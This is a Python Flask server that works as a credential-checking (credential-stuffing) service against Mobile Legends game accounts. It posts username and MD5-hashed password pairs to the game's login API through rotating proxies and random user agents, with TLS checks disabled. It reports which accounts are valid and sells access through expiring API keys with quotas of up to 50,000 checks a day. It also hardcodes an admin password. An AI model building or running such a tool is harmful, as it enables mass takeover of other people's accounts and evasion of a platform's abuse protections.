from flask import Flask, request, jsonify
import hashlib
import random
import os
import httpx
from fake_useragent import UserAgent
import logging
import asyncio
from datetime import datetime, timedelta

# Initialize Flask App
app = Flask(__name__)

# Global Variables
API_KEY = "your_secure_api_key_here"  # Default admin key
admin_password = "Al159875325"  # Super password to authenticate admin
api_keys = {}  # Dictionary to store API keys and associated user names
check_limits = {}  # Store daily check limits for each API key
MAX_DAILY_CHECKS = 50000  # Max checks per day
DEFAULT_VALIDITY_PERIOD = timedelta(days=1)  # Default API key validity period (1 day)
api_key_expiry_time = timedelta(days=1)  # API key validity period

# Proxy Manager Class (Round-Robin Rotation)
PROXY_FILE = 'proxies.txt'

class ProxyManager:
    def __init__(self, proxy_file=PROXY_FILE):
        self.proxy_file = proxy_file
        self.proxies = self.load_proxies()
        self.current_proxy_index = 0  # Start from the first proxy

    def load_proxies(self):
        """Load proxies from a file"""
        if not os.path.exists(self.proxy_file):
            raise FileNotFoundError(f"Proxy file '{self.proxy_file}' not found.")
        
        with open(self.proxy_file, 'r') as file:
            proxy_list = [line.strip() for line in file.readlines()]
        
        if not proxy_list:
            raise ValueError("No proxies found in the proxy file.")
        
        return proxy_list

    def get_next_proxy(self):
        """Return the next proxy in a round-robin manner"""
        if len(self.proxies) == 0:
            raise ValueError("No proxies available.")
        
        # Get the current proxy
        proxy = self.proxies[self.current_proxy_index]
        
        # Move to the next proxy for the next request
        self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxies)
        
        return proxy

# Load proxies
proxy_manager = ProxyManager()

# Utility Functions
def hash_md5(text):
    return hashlib.md5(text.encode('utf-8')).hexdigest()

def generate_user_agent():
    ua = UserAgent()
    return ua.random

def generate_api_key(name, max_checks=MAX_DAILY_CHECKS, validity_period=DEFAULT_VALIDITY_PERIOD):
    # Generate unique API key
    key = hashlib.sha256(f"{name}{str(random.randint(1000, 9999))}".encode('utf-8')).hexdigest()
    
    # Store creation date, validity period, and checks limit for each key
    api_keys[key] = {
        'name': name,
        'max_checks': max_checks,
        'used_checks': 0,
        'last_checked': datetime.now(),
        'created_at': datetime.now(),
        'validity_period': validity_period,
    }
    
    return key

# Account Checking Function
async def check_account(username, password, proxy_manager):
    md5_password = hash_md5(password)
    data = {
        'account': username,
        'md5pwd': md5_password,
        'module': 'mpass',
        'type': 'web',
        'app_id': '668'
    }

    headers = {
        'User-Agent': generate_user_agent()
    }

    api_urls = [
        'https://sg-api.mobilelegends.com/base/login',
        'https://api.mobilelegends.com/base/login'
    ]

    for attempt in range(3):
        try:
            current_proxy = proxy_manager.get_next_proxy()
            if not current_proxy:
                return {"status": "error", "message": "No available proxies"}

            transport = httpx.AsyncHTTPTransport(
                verify=False,
                retries=1,
                proxy=current_proxy
            )

            async with httpx.AsyncClient(
                transport=transport,
                timeout=30.0,
                headers=headers,
                follow_redirects=True
            ) as client:
                url = random.choice(api_urls)
                response = await client.post(url, data=data)

                if response.status_code == 200:
                    res = response.json()
                    msg = res.get('msg', '')

                    if msg == "ok":
                        return {"status": "success", "message": "Account is valid"}
                    elif msg == "Error_PasswdError":
                        return {"status": "failed", "message": "Incorrect password"}
                    elif msg == "Error_NoAccount":
                        return {"status": "failed", "message": "No account found"}
                    else:
                        return {"status": "failed", "message": "Other error"}

        except (httpx.ProxyError, httpx.ConnectTimeout, httpx.HTTPStatusError) as e:
            continue
        except Exception as e:
            continue

    return {"status": "failed", "message": "Unknown error occurred"}

# Fetch the current public IP address
async def fetch_current_ip():
    try:
        async with httpx.AsyncClient() as client:
            response = await client.get('https://ifconfig.me')
            if response.status_code == 200:
                return response.text.strip()
    except Exception as e:
        return None

# Flask Endpoints

@app.route('/generate_api_key', methods=['POST'])
def generate_api_key_endpoint():
    # Authenticate with admin password
    data = request.get_json()
    admin_pass = data.get('admin_password')
    
    if admin_pass != admin_password:
        return jsonify({"status": "error", "message": "Unauthorized"}), 403

    # Generate new API Key
    name = data.get('name')
    max_checks = data.get('max_checks', MAX_DAILY_CHECKS)
    validity_period_days = data.get('validity_period', 1)  # Default validity period is 1 day
    
    if not name:
        return jsonify({"status": "error", "message": "Name is required"}), 400

    validity_period = timedelta(days=validity_period_days)
    api_key = generate_api_key(name, max_checks, validity_period)
    
    return jsonify({
        "status": "success",
        "api_key": api_key,
        "name": name,
        "max_checks": max_checks,
        "validity_period": validity_period_days
    })

@app.route('/check_account', methods=['POST'])
async def check_account_endpoint():
    # Check for API key in request headers
    api_key = request.headers.get('X-API-Key')
    if api_key not in api_keys:
        return jsonify({"status": "error", "message": "Unauthorized"}), 403

    # Check if the API key has expired
    user_data = api_keys[api_key]
    created_at = user_data['created_at']
    validity_period = user_data['validity_period']

    if datetime.now() - created_at > validity_period:
        return jsonify({"status": "error", "message": "API key has expired"}), 403

    # Check if daily check limit is reached
    last_checked = user_data['last_checked']
    used_checks = user_data['used_checks']
    max_checks = user_data['max_checks']

    # Reset checks if a new day has started
    if datetime.now() - last_checked > api_key_expiry_time:
        api_keys[api_key]['used_checks'] = 0
        api_keys[api_key]['last_checked'] = datetime.now()

    if used_checks >= max_checks:
        return jsonify({"status": "error", "message": "Daily check limit reached"}), 400

    # Parse the request data
    data = request.get_json()

    if not data or 'username' not in data or 'password' not in data:
        return jsonify({"status": "error", "message": "Missing username or password"}), 400

    username = data['username']
    password = data['password']

    # Run the account checking function asynchronously
    result = await check_account(username, password, proxy_manager)

    # If the account check was successful or failed, update the usage count
    if result['status'] in ['success', 'failed']:
        api_keys[api_key]['used_checks'] += 1

    return jsonify(result)

@app.route('/remaining_checks', methods=['GET'])
def remaining_checks_endpoint():
    # Check for API key in request headers
    api_key = request.headers.get('X-API-Key')
    if api_key not in api_keys:
        return jsonify({"status": "error", "message": "Unauthorized"}), 403

    # Check if the API key has expired
    user_data = api_keys[api_key]
    created_at = user_data['created_at']
    validity_period = user_data['validity_period']

    if datetime.now() - created_at > validity_period:
        return jsonify({"status": "error", "message": "API key has expired"}), 403

    last_checked = user_data['last_checked']
    used_checks = user_data['used_checks']
    max_checks = user_data['max_checks']

    # Reset checks if a new day has started
    if datetime.now() - last_checked > api_key_expiry_time:
        api_keys[api_key]['used_checks'] = 0
        api_keys[api_key]['last_checked'] = datetime.now()

    remaining_checks = max_checks - used_checks
    return jsonify({"status": "success", "remaining_checks": remaining_checks})

@app.route('/current_ip', methods=['GET'])
async def current_ip():
    ip = await fetch_current_ip()
    if ip:
        return jsonify({"status": "success", "ip": ip})
    return jsonify({"status": "error", "message": "Could not fetch IP"}), 500

if __name__ == '__main__':
    app.run(debug=True)
